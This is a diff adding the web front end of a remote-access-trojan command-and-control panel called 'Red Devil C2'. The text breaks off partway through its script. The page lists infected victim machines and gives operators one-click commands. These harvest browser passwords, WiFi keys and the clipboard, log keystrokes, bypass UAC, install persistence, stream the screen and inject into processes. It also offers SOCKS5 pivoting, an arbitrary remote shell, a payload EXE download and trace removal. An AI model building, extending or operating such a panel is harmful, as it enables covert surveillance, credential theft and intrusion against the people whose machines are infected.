@@ -1,0 +1,1195 @@
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JOD'S RED ROOM // RED DEVIL C2</title>
+<style>
+:root{--red:#ff1a1a;--blood:#8a0000;--dark:#0a0000;--panel:#120404;--card:#160606;
+--line:rgba(255,26,26,.16);--text:#e8c8c8;--dim:#8a5a5a;--glow:0 0 18px rgba(255,26,26,.55);
+--font:'Consolas','Cascadia Code',monospace}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{background:radial-gradient(ellipse at 50% -20%,#2a0000 0%,var(--dark) 55%,#050000 100%);
+color:var(--text);font-family:var(--font);overflow:hidden;height:100vh;position:relative}
+/* particle canvas */
+#fx{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.55}
+/* scanlines + vignette */
+#fx::before{content:"";position:fixed;inset:0;z-index:1;pointer-events:none;
+background:repeating-linear-gradient(0deg,rgba(255,26,26,.025) 0 1px,transparent 1px 3px)}
+#fx::after{content:"";position:fixed;inset:0;z-index:1;pointer-events:none;
+background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,.55) 100%)}
+#app{position:relative;z-index:2;display:flex;height:100vh}
+.sidebar{width:52px;background:linear-gradient(180deg,#0d0101,#1a0404);border-right:1px solid var(--line);
+display:flex;flex-direction:column;align-items:center;padding-top:16px;gap:6px;z-index:3;flex-shrink:0;
+box-shadow:inset -1px 0 12px rgba(255,26,26,.08)}
+.sidebar .logo{font-size:22px;color:var(--red);text-shadow:var(--glow);margin-bottom:18px;cursor:default;
+animation:flicker 3s infinite}
+@keyframes flicker{0%,100%{opacity:1}92%{opacity:1}93%{opacity:.3}94%{opacity:1}97%{opacity:.5}98%{opacity:1}}
+.sidebar .icon{color:#5a3a3a;font-size:17px;cursor:pointer;position:relative;padding:9px 0;width:100%;
+text-align:center;transition:all .15s;border-left:2px solid transparent}
+.sidebar .icon:hover{color:var(--red);text-shadow:var(--glow);border-left-color:var(--red)}
+.sidebar .icon.active{color:var(--red);text-shadow:var(--glow);border-left-color:var(--red);
+background:linear-gradient(90deg,rgba(255,26,26,.12),transparent)}
+.sidebar .badge{position:absolute;top:3px;right:6px;background:var(--red);color:#fff;font-size:8px;
+padding:1px 4px;border-radius:8px;min-width:14px;text-align:center;box-shadow:var(--glow)}
+.main{flex:1;display:flex;flex-direction:column;min-width:0}
+.header{background:linear-gradient(180deg,rgba(20,3,3,.95),rgba(10,1,1,.95));
+border-bottom:1px solid var(--line);padding:9px 16px;display:flex;align-items:center;gap:12px;
+flex-wrap:wrap;min-height:52px;backdrop-filter:blur(4px)}
+.header h1{color:var(--red);font-size:14px;margin-right:auto;white-space:nowrap;letter-spacing:1px;
+text-shadow:var(--glow);animation:flicker 4s infinite}
+.header .back-btn{cursor:pointer;color:var(--red);font-size:12px;padding:4px 12px;border-radius:4px;
+background:rgba(255,26,26,.06);border:1px solid var(--line);display:none;transition:all .12s}
+.header .back-btn:hover{background:rgba(255,26,26,.14);box-shadow:var(--glow)}
+.search-box{background:rgba(15,3,3,.9);border:1px solid var(--line);border-radius:6px;padding:6px 12px;
+color:var(--text);font-size:12px;width:210px;outline:none;font-family:var(--font);
+transition:border-color .15s,box-shadow .15s}
+.search-box:focus{border-color:var(--red);box-shadow:var(--glow)}
+.stat{color:var(--dim);font-size:11px;white-space:nowrap}
+.stat b{color:var(--red)}
+#panel{flex:1;overflow-y:auto;padding:16px;scroll-behavior:smooth}
+::-webkit-scrollbar{width:6px;height:6px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:rgba(255,26,26,.25);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:rgba(255,26,26,.5)}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(310px,1fr));gap:12px}
+.card{background:linear-gradient(160deg,#170505,#0e0202);border-radius:12px;padding:14px;
+border:1px solid var(--line);cursor:pointer;transition:all .18s;border-left:3px solid var(--red);
+position:relative;user-select:none;overflow:hidden;animation:cardIn .25s ease}
+@keyframes cardIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.card::before{content:"";position:absolute;top:0;left:-100%;width:100%;height:100%;
+background:linear-gradient(90deg,transparent,rgba(255,26,26,.08),transparent);
+transition:left .5s}
+.card:hover::before{left:100%}
+.card:hover{border-color:rgba(255,26,26,.4);box-shadow:0 0 22px rgba(255,26,26,.18);transform:translateY(-2px)}
+.card.offline{border-left-color:#551111;opacity:.6;box-shadow:none}
+.card .top{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+.card .hostname{color:#ffe0e0;font-size:13px;font-weight:700;white-space:nowrap;overflow:hidden;
+text-overflow:ellipsis;max-width:180px;text-shadow:0 0 8px rgba(255,26,26,.4)}
+.card .cid{color:#7a4040;font-size:10px;font-family:var(--font)}
+.card .led{position:absolute;top:12px;right:12px;width:8px;height:8px;border-radius:50%;
+background:var(--red);box-shadow:0 0 10px var(--red);animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 6px var(--red)}50%{opacity:.4;box-shadow:0 0 14px var(--red)}}
+.card .info{display:flex;gap:14px;font-size:11px;color:var(--dim);flex-wrap:wrap}
+.card .info .label{color:#7a4040}
+.card .badges{margin-top:9px;display:flex;gap:5px;flex-wrap:wrap}
+.card .badge{font-size:9px;padding:2px 7px;border-radius:4px;background:rgba(255,26,26,.1);
+color:#ff8080;border:1px solid rgba(255,26,26,.2)}
+.card .badge.tag{background:rgba(90,40,40,.4);color:#b08080;border-color:rgba(90,40,40,.3)}
+.card .badge.offline-badge{background:rgba(85,17,17,.3);color:#883333;border-color:rgba(85,17,17,.3)}
+.notes-preview{font-size:10px;color:#704040;margin-top:6px;font-style:italic;white-space:nowrap;
+overflow:hidden;text-overflow:ellipsis}
+#deviceView{display:none;height:100%;flex-direction:column;overflow:hidden;padding:16px}
+#deviceView.show{display:flex}
+#deviceViewUpper{flex:0 0 auto;overflow-y:auto;max-height:46vh;padding-right:4px}
+.device-header{background:linear-gradient(160deg,#180404,#0d0202);border-radius:14px;padding:18px;
+border:1px solid var(--line);margin-bottom:14px;border-left:3px solid var(--red);
+box-shadow:0 0 24px rgba(255,26,26,.08);position:relative;overflow:hidden}
+.device-header::after{content:"☠";position:absolute;right:14px;bottom:8px;font-size:52px;
+opacity:.06;color:var(--red)}
+.device-header .d-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
+.device-header .d-name{color:#ffe0e0;font-size:19px;font-weight:700;text-shadow:0 0 12px rgba(255,26,26,.5)}
+.device-header .d-cid{color:#7a4040;font-size:11px;font-family:var(--font)}
+.device-header .d-info{display:flex;gap:22px;font-size:12px;color:#c08888;flex-wrap:wrap}
+.device-header .d-info span .lbl{color:#7a4040}
+.device-header .d-actions{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap}
+.device-header .d-actions .da-btn{padding:5px 13px;font-size:10px;border-radius:4px;
+border:1px solid var(--line);background:rgba(20,5,5,.85);color:#d0a0a0;cursor:pointer;transition:all .12s}
+.device-header .d-actions .da-btn:hover{background:rgba(255,26,26,.12);color:#fff;box-shadow:var(--glow)}
+.device-header .d-actions .da-btn.danger:hover{background:rgba(255,26,26,.25);border-color:var(--red)}
+.qc-section{margin-bottom:14px}
+.qc-section .qc-title{color:#a06060;font-size:11px;text-transform:uppercase;letter-spacing:2px;
+margin-bottom:8px;border-bottom:1px solid rgba(255,26,26,.1);padding-bottom:5px}
+.qc-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:7px}
+.qc-btn{padding:11px 13px;border-radius:7px;border:1px solid var(--line);
+background:linear-gradient(160deg,#170505,#0f0303);color:#d0b0b0;font-size:11px;cursor:pointer;
+transition:all .13s;text-align:left;font-family:var(--font);position:relative;overflow:hidden}
+.qc-btn::before{content:"";position:absolute;left:0;top:0;bottom:0;width:2px;background:var(--red);
+box-shadow:var(--glow);opacity:0;transition:opacity .13s}
+.qc-btn:hover{background:rgba(255,26,26,.09);border-color:rgba(255,26,26,.35);color:#fff;
+transform:translateX(3px)}
+.qc-btn:hover::before{opacity:1}
+.qc-btn .qc-icon{color:var(--red);margin-right:7px;font-size:12px}
+.qc-btn .qc-desc{display:block;font-size:9px;color:#704040;margin-top:3px}
+.custom-cmd-area{background:linear-gradient(160deg,#170505,#0e0202);border-radius:12px;padding:14px;
+border:1px solid var(--line);margin-bottom:14px}
+.custom-cmd-area textarea{width:100%;background:#0a0101;border:1px solid var(--line);border-radius:6px;
+padding:11px;color:#ffd0d0;font-size:12px;outline:none;resize:vertical;min-height:62px;
+font-family:var(--font);transition:border-color .15s,box-shadow .15s}
+.custom-cmd-area textarea:focus{border-color:var(--red);box-shadow:var(--glow)}
+.custom-cmd-area .cc-row{display:flex;gap:8px;margin-top:9px}
+.custom-cmd-area .cc-btn{padding:7px 20px;border-radius:5px;font-size:11px;cursor:pointer;
+transition:all .12s;border:none;font-weight:700;font-family:var(--font)}
+.cc-btn-send{background:var(--red);color:#fff;box-shadow:var(--glow)}
+.cc-btn-send:hover{background:#ff4040;transform:scale(1.02)}
+.cc-btn-clear{background:rgba(90,30,30,.5);color:#c08080}
+.device-output{background:#0a0101;border-radius:10px;border:1px solid var(--line);
+flex:1;display:flex;flex-direction:column;min-height:150px;margin-top:12px;overflow:hidden}
+.device-output .do-header{display:flex;justify-content:space-between;align-items:center;
+padding:9px 14px;border-bottom:1px solid var(--line);background:rgba(20,3,3,.8)}
+.device-output .do-header .do-title{color:var(--red);font-size:10px;text-transform:uppercase;
+letter-spacing:2px;text-shadow:var(--glow)}
+.device-output .do-header .do-clear{color:#7a4040;font-size:10px;cursor:pointer}
+.device-output .do-header .do-clear:hover{color:var(--red)}
+.device-output .do-body{flex:1;overflow-y:auto;padding:11px 14px;font-family:var(--font);
+font-size:11px;white-space:pre-wrap;word-break:break-all;color:#c09090;max-height:390px}
+.device-output .do-body .do-line{padding:3px 0;border-bottom:1px solid rgba(255,26,26,.04);
+animation:lineIn .15s ease}
+@keyframes lineIn{from{opacity:0}to{opacity:1}}
+.device-output .do-body .do-line .do-ts{color:#5a2a2a;margin-right:8px}
+.device-output .do-body .do-line .do-cmd{color:#ff6060;text-shadow:0 0 6px rgba(255,26,26,.4)}
+.device-output .do-body .do-line .do-out{color:#e0c0c0;display:block;padding-left:22px}
+.device-output .do-body .cursor-line{color:var(--red);animation:blink 1s steps(2) infinite}
+@keyframes blink{0%,49%{opacity:1}50%,100%{opacity:0}}
+.context-menu{position:fixed;background:rgba(14,2,2,.98);border:1px solid rgba(255,26,26,.4);
+border-radius:9px;padding:4px 0;min-width:170px;z-index:1000;box-shadow:0 8px 30px rgba(0,0,0,.8),
+0 0 20px rgba(255,26,26,.15);display:none;backdrop-filter:blur(4px)}
+.context-menu .item{padding:7px 15px;font-size:12px;color:#d0a0a0;cursor:pointer;transition:all .1s}
+.context-menu .item:hover{background:rgba(255,26,26,.12);color:#fff}
+.context-menu .item.danger:hover{background:rgba(255,26,26,.22);color:#ff6060}
+.context-menu .sep{border-top:1px solid rgba(255,26,26,.2);margin:3px 10px}
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(2px);
+z-index:999;display:none;align-items:center;justify-content:center}
+.modal-overlay.show{display:flex;animation:fadeIn .15s ease}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.modal{background:linear-gradient(170deg,#1a0505,#0d0202);border:1px solid rgba(255,26,26,.4);
+border-radius:14px;padding:24px;min-width:360px;max-width:520px;box-shadow:0 20px 60px rgba(0,0,0,.8),
+0 0 30px rgba(255,26,26,.15)}
+.modal h2{color:var(--red);font-size:15px;margin-bottom:14px;text-shadow:var(--glow)}
+.modal input,.modal textarea,.modal select{width:100%;background:#0a0101;border:1px solid var(--line);
+border-radius:6px;padding:8px 12px;color:#ffd0d0;font-size:12px;outline:none;margin-bottom:10px;
+font-family:var(--font)}
+.modal input:focus,.modal textarea:focus{border-color:var(--red);box-shadow:var(--glow)}
+.modal textarea{resize:vertical;min-height:62px}
+.modal .btn-row{display:flex;gap:8px;justify-content:flex-end;margin-top:8px}
+.modal .btn{padding:6px 18px;border-radius:5px;font-size:11px;cursor:pointer;transition:all .12s;
+border:none;font-weight:700;font-family:var(--font)}
+.modal .btn-primary{background:var(--red);color:#fff;box-shadow:var(--glow)}
+.modal .btn-primary:hover{background:#ff4040}
+.modal .btn-secondary{background:rgba(90,30,30,.5);color:#c08080}
+.modal .btn-danger{background:#8a0000;color:#fff}
+.modal .btn-danger:hover{background:#ff1a1a}
+.modal p{color:#a07070;font-size:12px;margin-bottom:12px}
+#login{position:fixed;inset:0;background:radial-gradient(ellipse at center,#1c0000 0%,#050000 70%);
+display:flex;align-items:center;justify-content:center;z-index:9999}
+.login-box{background:linear-gradient(170deg,#1a0505,#0d0202);border:1px solid rgba(255,26,26,.35);
+border-radius:16px;padding:36px;text-align:center;max-width:360px;width:92%;
+box-shadow:0 0 60px rgba(255,26,26,.12)}
+.login-box .skull{font-size:44px;color:var(--red);text-shadow:0 0 25px var(--red);animation:flicker 2.5s infinite}
+.login-box h1{color:var(--red);font-size:19px;margin:10px 0 4px;letter-spacing:3px;text-shadow:var(--glow)}
+.login-box p{color:#7a4040;font-size:11px;margin-bottom:20px;letter-spacing:1px}
+.login-box input{width:100%;background:#0a0101;border:1px solid var(--line);border-radius:7px;
+padding:10px 14px;color:#ffd0d0;font-size:13px;outline:none;text-align:center;font-family:var(--font)}
+.login-box input:focus{border-color:var(--red);box-shadow:var(--glow)}
+.login-box button{margin-top:14px;width:100%;padding:10px;background:linear-gradient(90deg,#8a0000,#ff1a1a);
+color:#fff;border:none;border-radius:7px;font-size:13px;font-weight:700;cursor:pointer;
+font-family:var(--font);box-shadow:var(--glow);transition:all .12s;letter-spacing:1px}
+.login-box button:hover{transform:scale(1.02);box-shadow:0 0 30px rgba(255,26,26,.6)}
+.login-box .error{color:#ff6060;font-size:11px;margin-top:10px}
+.alert-container{position:fixed;top:12px;right:12px;z-index:10000;display:flex;flex-direction:column;gap:6px}
+.alert{background:linear-gradient(170deg,#1a0505,#0d0202);border:1px solid rgba(255,26,26,.35);
+border-radius:9px;padding:11px 15px;min-width:260px;max-width:360px;
+box-shadow:0 8px 25px rgba(0,0,0,.6),0 0 16px rgba(255,26,26,.12);
+animation:slideIn .2s ease;font-size:12px;border-left:3px solid var(--red)}
+.alert .title{font-weight:700;color:var(--red);text-shadow:var(--glow)}
+.alert .title.info{color:var(--red)}.alert .title.success{color:#ff6060}
+.alert .title.warning{color:#ffaa00}.alert .title.error{color:#ff3355}
+.alert .body{color:#a07070;margin-top:3px;font-size:11px}
+@keyframes slideIn{from{transform:translateX(50px);opacity:0}to{transform:none;opacity:1}}
+#logPanel,#filesPanel{height:100%;display:none;flex-direction:column}
+.logs,.files{flex:1;overflow-y:auto;padding:12px;font-family:var(--font);font-size:11px}
+.logs .line{padding:3px 0;color:#b08080;border-bottom:1px solid rgba(255,26,26,.03)}
+.logs .line span{color:#5a2a2a;margin-right:8px}
+</style></head><body>
+<canvas id="fx"></canvas>
+<div id="login">
+<div class="login-box">
+<div class="skull">&#9760;</div>
+<h1>JOD'S RED ROOM</h1><p>RED DEVIL COMMAND &amp; CONTROL // v7.3-CS</p>
+<input type="password" id="pwd" placeholder="Enter access key" autocomplete="off"
+onkeydown="if(event.key==='Enter')login()">
+<button onclick="login()">&#9760; AUTHENTICATE</button>
+<div id="loginError" class="error"></div>
+</div></div>
+<div id="app" style="display:none">
+<div class="sidebar">
+<div class="logo">&#9760;</div>
+<div class="icon active" onclick="showPanel('dashboard')" id="icoDash" title="Dashboard">&#9632;</div>
+<div class="icon" onclick="showPanel('log')" id="icoLog" title="Log">&#9776;</div>
+<div class="icon" onclick="showPanel('files')" id="icoFiles" title="Files">&#128193;<span class="badge" id="fileCount">0</span></div>
+<div class="icon" onclick="window.open('/deploy','_blank')" title="Deploy">&#9881;</div>
+</div>
+<div class="main">
+<div class="header">
+<span class="back-btn" id="backBtn" onclick="backToDashboard()">&#9664; BACK</span>
+<h1 id="mainTitle">JOD'S RED ROOM // RED DEVIL</h1>
+<input class="search-box" id="search" placeholder="Search host / IP / tag / cid..." oninput="render()" style="display:inline">
+<span class="stat" id="statBar">0 clients</span>
+<a href="/dl" target="_blank" style="padding:5px 13px;font-size:10px;border-radius:4px;border:1px solid var(--line);background:rgba(20,5,5,.85);color:#ff8080;text-decoration:none;cursor:pointer;transition:all .12s">&#11015; EXE</a>
+</div>
+<div id="socks-card" style="border:1px solid #333;border-radius:8px;padding:12px;margin:12px 0;background:#111">
+  <h3 style="margin:0 0 8px">SOCKS5 Pivots</h3>
+  <div id="socks-box">loading…</div>
+</div>
+<script>
+async function socksRefresh(){
+  const box = document.getElementById('socks-box');
+  const t = localStorage.getItem('c2_token') || '';
+  if(!t){ box.textContent = 'login pehle karo'; return; }
+  try{
+    const r = await fetch('/api/socks?token=' + encodeURIComponent(t));
+    if(!r.ok) throw new Error('HTTP ' + r.status);
+    const j = await r.json();
+    box.textContent = '';
+    const l = document.createElement('p');
+    l.textContent = 'Listener: ' + j.listener + (j.auth ? '  (user: nexus / pass: token)' : '') +
+                    '  |  beacons ready: ' + (j.beacons_ready||[]).length;
+    box.appendChild(l);
+    if(!j.pivots.length){
+      const e = document.createElement('p');
+      e.textContent = 'koi active pivot nahi — beacon online + rebuild ke baad curl --proxy test karo';
+      box.appendChild(e);
+    } else {
+      j.pivots.forEach(p => {
+        const d = document.createElement('div');
+        d.textContent = 'cid ' + p.cid + ' · channel ' + p.channel + ' · age ' + p.age + 's';
+        box.appendChild(d);
+      });
+    }
+  }catch(e){ box.textContent = 'fetch fail: ' + e; }
+}
+socksRefresh(); setInterval(socksRefresh, 3000);
+</script>
+<div id="dashboardPanel"><div id="panel" class="grid"></div></div>
+<div id="deviceView">
+  <div id="deviceViewUpper">
+  <div class="device-header" id="devHeader"></div>
+  <div id="liveCard" style="display:none;background:linear-gradient(160deg,#170505,#0e0202);border:1px solid rgba(255,26,26,.16);border-radius:12px;padding:12px;margin-bottom:14px">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+      <span style="color:#ff1a1a;font-size:11px;text-transform:uppercase;letter-spacing:2px">LIVE SCREEN</span>
+      <span id="liveFps" style="color:#7a4040;font-size:10px">0 fps</span>
+    </div>
+    <img id="liveImg" style="width:100%;max-height:320px;object-fit:contain;background:#000;border-radius:6px" alt="no stream">
+    <div style="display:flex;gap:8px;margin-top:10px;align-items:center;flex-wrap:wrap">
+      <button class="da-btn" onclick="sendCmdToClient(currentViewCid,'sstream start 1 60')">START</button>
+      <button class="da-btn" onclick="sendCmdToClient(currentViewCid,'sstream stop')">STOP</button>
+      <select id="liveQ" onchange="liveRestart()" style="background:#0a0101;color:#d0a0a0;border:1px solid rgba(255,26,26,.2);border-radius:4px;padding:4px;font-size:10px">
+        <option value="30">30% quality</option><option value="50" selected>50%</option>
+        <option value="70">70%</option><option value="85">85%</option>
+      </select>
+      <select id="liveI" onchange="liveRestart()" style="background:#0a0101;color:#d0a0a0;border:1px solid rgba(255,26,26,.2);border-radius:4px;padding:4px;font-size:10px">
+        <option value="0.5">0.5s interval</option><option value="1" selected>1s</option>
+        <option value="2">2s</option><option value="5">5s</option>
+      </select>
+      <a id="liveRaw" href="#" target="_blank" style="color:#ff8a5a;font-size:10px">RAW MJPEG</a>
+
+    <div id="injCard" style="display:none;background:linear-gradient(160deg,#170505,#0e0202);border:1px solid rgba(255,26,26,.16);border-radius:12px;padding:12px;margin-bottom:14px">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+      <span style="color:#ff1a1a;font-size:11px;text-transform:uppercase;letter-spacing:2px">PROCESS INJECTION</span>
+    </div>
+    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+      <select id="injPid" style="background:#0a0101;color:#d0a0a0;border:1px solid rgba(255,26,26,.2);border-radius:4px;padding:6px;font-size:11px;max-width:220px">
+        <option value="">— process pick karo —</option>
+      </select>
+      <select id="injMethod" style="background:#0a0101;color:#d0a0a0;border:1px solid rgba(255,26,26,.2);border-radius:4px;padding:6px;font-size:11px">
+        <option value="remote_thread">CreateRemoteThread</option>
+        <option value="apc">APC</option>
+        <option value="hijack">Thread Hijack</option>
+      </select>
+      <button class="da-btn" onclick="injTest()">&#128295; TEST (EBFE)</button>
+    </div>
+    </div>
+    </div>
+  </div>
+  <div class="custom-cmd-area">
+    <textarea id="customCmd" placeholder="Type any command here..." rows="2"></textarea>
+    <div class="cc-row">
+      <button class="cc-btn cc-btn-send" onclick="sendCustomCmd()">&#9654; EXECUTE</button>
+      <button class="cc-btn cc-btn-clear" onclick="document.getElementById('customCmd').value=''">CLEAR</button>
+    </div>
+  </div>
+  <div class="qc-section">
+    <div class="qc-title">&#9889; QUICK RECON</div>
+    <div class="qc-grid">
+      <button class="qc-btn" onclick="quickCmd('whoami')"><span class="qc-icon">&#128100;</span> whoami<span class="qc-desc">Current user</span></button>
+      <button class="qc-btn" onclick="quickCmd('hostname')"><span class="qc-icon">&#128421;</span> hostname<span class="qc-desc">Machine name</span></button>
+      <button class="qc-btn" onclick="quickCmd('exec ipconfig')"><span class="qc-icon">&#127760;</span> ipconfig<span class="qc-desc">Network info</span></button>
+      <button class="qc-btn" onclick="quickCmd('sysinfo')"><span class="qc-icon">&#8505;</span> sysinfo<span class="qc-desc">Full system info</span></button>
+      <button class="qc-btn" onclick="quickCmd('exec whoami /groups')"><span class="qc-icon">&#128274;</span> whoami /groups<span class="qc-desc">Group membership</span></button>
+      <button class="qc-btn" onclick="quickCmd('exec systeminfo')"><span class="qc-icon">&#9881;</span> systeminfo<span class="qc-desc">OS details</span></button>
+      <button class="qc-btn" onclick="quickCmd('exec tasklist /v')"><span class="qc-icon">&#9776;</span> tasklist<span class="qc-desc">Running processes</span></button>
+      <button class="qc-btn" onclick="quickCmd('exec net user')"><span class="qc-icon">&#128101;</span> net user<span class="qc-desc">Local users</span></button>
+    </div>
+  </div>
+  <div class="qc-section">
+    <div class="qc-title">&#128220; HARVEST</div>
+    <div class="qc-grid">
+      <button class="qc-btn" onclick="quickCmd('browser-creds')"><span class="qc-icon">&#128273;</span> browser-creds<span class="qc-desc">Saved passwords</span></button>
+      <button class="qc-btn" onclick="quickCmd('wifi')"><span class="qc-icon">&#128246;</span> wifi<span class="qc-desc">WiFi passwords</span></button>
+      <button class="qc-btn" onclick="quickCmd('clipboard')"><span class="qc-icon">&#128203;</span> clipboard<span class="qc-desc">Clipboard content</span></button>
+      <button class="qc-btn" onclick="quickCmd('screenshot')"><span class="qc-icon">&#128247;</span> screenshot<span class="qc-desc">Screen capture</span></button>
+      <button class="qc-btn" onclick="quickCmd('checkav')"><span class="qc-icon">&#128737;</span> checkav<span class="qc-desc">Detect AV/EDR</span></button>
+    </div>
+  </div>
+  <div class="qc-section">
+    <div class="qc-title">&#128295; PERSISTENCE // MANUAL ONLY</div>
+    <div class="qc-grid">
+      <button class="qc-btn" onclick="quickCmd('persist')"><span class="qc-icon">&#128170;</span> persist<span class="qc-desc">Apply all 8 layers</span></button>
+      <button class="qc-btn" onclick="quickCmd('uac')"><span class="qc-icon">&#128737;</span> uac<span class="qc-desc">UAC bypass</span></button>
+      <button class="qc-btn" onclick="quickCmd('keylog start')"><span class="qc-icon">&#9000;</span> keylog start<span class="qc-desc">Start keylogger</span></button>
+      <button class="qc-btn" onclick="quickCmd('keylog dump')"><span class="qc-icon">&#128196;</span> keylog dump<span class="qc-desc">Export keystrokes</span></button>
+      <button class="qc-btn" onclick="quickCmd('keylog stop')"><span class="qc-icon">&#9632;</span> keylog stop<span class="qc-desc">Stop keylogger</span></button>
+    </div>
+  </div>
+  <div class="qc-section">
+    <div class="qc-title">&#128193; FILES</div>
+    <div class="qc-grid">
+      <button class="qc-btn" onclick="quickCmd('dir C:\\Users')"><span class="qc-icon">&#128193;</span> dir Users<span class="qc-desc">List user folders</span></button>
+      <button class="qc-btn" onclick="quickCmd('dir C:\\Users\\%USERNAME%\\Desktop')"><span class="qc-icon">&#128193;</span> dir Desktop<span class="qc-desc">Desktop contents</span></button>
+      <button class="qc-btn" onclick="quickCmd('dir C:\\Users\\%USERNAME%\\Documents')"><span class="qc-icon">&#128193;</span> dir Documents<span class="qc-desc">Documents folder</span></button>
+    </div>
+  </div>
+  <div class="qc-section">
+    <div class="qc-title">&#9888; DANGER ZONE</div>
+    <div class="qc-grid">
+      <button class="qc-btn" onclick="if(confirm('Kill this process?'))quickCmd('exit')" style="border-color:rgba(255,26,26,.35);color:#ff6060"><span class="qc-icon" style="color:#ff6060">&#128488;</span> exit<span class="qc-desc" style="color:#7a3030">Disconnect client</span></button>
+      <button class="qc-btn" onclick="if(confirm('Remove ALL traces from victim?'))quickCmd('uninstall')" style="border-color:rgba(255,26,26,.35);color:#ff6060"><span class="qc-icon" style="color:#ff6060">&#128465;</span> uninstall<span class="qc-desc" style="color:#7a3030">Self-destruct</span></button>
+    </div>
+  </div>
+  </div>
+  <div class="device-output">
+    <div class="do-header">
+      <span class="do-title">&#9654; COMMAND OUTPUT // LIVE</span>
+      <span class="do-clear" onclick="document.getElementById('devOutput').innerHTML=''">CLEAR</span>
+    </div>
+  <div class="term-bar" style="display:flex;align-items:center;gap:8px;margin-top:10px;background:#0a0101;border:1px solid rgba(255,26,26,.16);border-radius:8px;padding:8px 12px;font-size:12px;flex-shrink:0">
+    <span style="color:#ff1a1a">JOD@<span id="termHost">?</span>:~#</span>
+    <input id="termInput" autocomplete="off" spellcheck="false"
+      style="flex:1;background:transparent;border:none;outline:none;color:#e0c0c0;font-family:Consolas,monospace;font-size:12px"
+      placeholder="terminal — Enter send, ↑↓ history, Ctrl+L clear">
+  </div>
+    <div class="do-body" id="devOutput">
+      <div class="do-line" style="color:#5a2a2a">root@jod:~# waiting for beacon output...</div>
+      <div class="cursor-line">&#9611;</div>
+    </div>
+  </div>
+</div>
+<div id="logPanel"><div class="logs" id="logBox"></div></div>
+<div id="filesPanel"><div class="files" id="filesBox"></div></div>
+</div></div>
+<div class="context-menu" id="ctxMenu">
+<div class="item" onclick="ctxCmd()">&#9889; Send Command</div>
+<div class="item" onclick="ctxView()">&#128269; View Device Details</div>
+<div class="sep"></div>
+<div class="item" onclick="ctxRename()">&#9998; Rename</div>
+<div class="item" onclick="ctxNotes()">&#128221; Edit Notes</div>
+<div class="item" onclick="ctxTags()">&#127991; Edit Tags</div>
+<div class="sep"></div>
+<div class="item danger" onclick="ctxDelete()">&#128465; Delete</div>
+</div>
+<div class="modal-overlay" id="renameModal"><div class="modal">
+<h2>&#9998; Rename Device</h2>
+<input id="renameInput" placeholder="New name..." maxlength="64">
+<div class="btn-row">
+<button class="btn btn-secondary" onclick="closeModal('renameModal')">Cancel</button>
+<button class="btn btn-primary" onclick="doRename()">Rename</button></div></div></div>
+<div class="modal-overlay" id="notesModal"><div class="modal">
+<h2>&#128221; Notes</h2>
+<textarea id="notesInput" placeholder="Private notes about this device..."></textarea>
+<div class="btn-row">
+<button class="btn btn-secondary" onclick="closeModal('notesModal')">Cancel</button>
+<button class="btn btn-primary" onclick="doNotes()">Save</button></div></div></div>
+<div class="modal-overlay" id="tagsModal"><div class="modal">
+<h2>&#127991; Tags</h2>
+<input id="tagsInput" placeholder="Comma-separated tags (e.g. critical,internal)">
+<div class="btn-row">
+<button class="btn btn-secondary" onclick="closeModal('tagsModal')">Cancel</button>
+<button class="btn btn-primary" onclick="doTags()">Save</button></div></div></div>
+<div class="modal-overlay" id="cmdModal"><div class="modal">
+<h2>&#9889; Send Command</h2>
+<textarea id="cmdInput" placeholder="command here..." rows="3"></textarea>
+<div class="btn-row">
+<button class="btn btn-secondary" onclick="closeModal('cmdModal')">Cancel</button>
+<button class="btn btn-primary" onclick="doCmd()">Send</button></div></div></div>
+<div class="modal-overlay" id="delModal"><div class="modal">
+<h2>&#9888; Delete Device?</h2>
+<p>Remove client <span id="delCid" style="color:var(--red)"></span> from the panel permanently.</p>
+<div class="btn-row">
+<button class="btn btn-secondary" onclick="closeModal('delModal')">Cancel</button>
+<button class="btn btn-danger" onclick="doDelete()">Delete</button></div></div></div>
+<script>
+let clients = {};
+let ctxCid = null;
+let token = localStorage.getItem('c2_token') || '';
+let currentViewCid = null;
+let _oldHTML = '';
+let _sessionStart = Date.now();
+function uc(html) { if (html === _oldHTML) return; _oldHTML = html; document.getElementById('panel').innerHTML = html; }
+function esc(s) { if (!s) return ''; return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function login() {
+  const pwd = document.getElementById('pwd').value;
+  if (!pwd) return;
+  token = pwd;
+  localStorage.setItem('c2_token', token);
+  initWS();
+}
+function logout() { token = ''; localStorage.removeItem('c2_token'); location.reload(); }
+let ws = null;
+function initWS() {
+  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+  const url = proto + '//' + location.host + '/ws/panel?token=' + encodeURIComponent(token);
+  ws = new WebSocket(url);
+  ws.onopen = () => { document.getElementById('login').style.display = 'none'; document.getElementById('app').style.display = 'flex'; loadFiles(); };
+  ws.onmessage = (e) => {
+    const msg = JSON.parse(e.data);
+    if (msg.type === 'ping') { ws.send(JSON.stringify({type:'pong'})); return; }
+    if (msg.type === 'error') { alert('Unauthorized: ' + msg.detail); logout(); return; }
+    if (msg.type === 'clients') {
+      clients = msg.data || {};
+      if (currentViewCid) {
+        if (clients[currentViewCid]) renderDeviceView(currentViewCid);
+        else backToDashboard();
+      }
+      render();
+      updateStats();
+    }
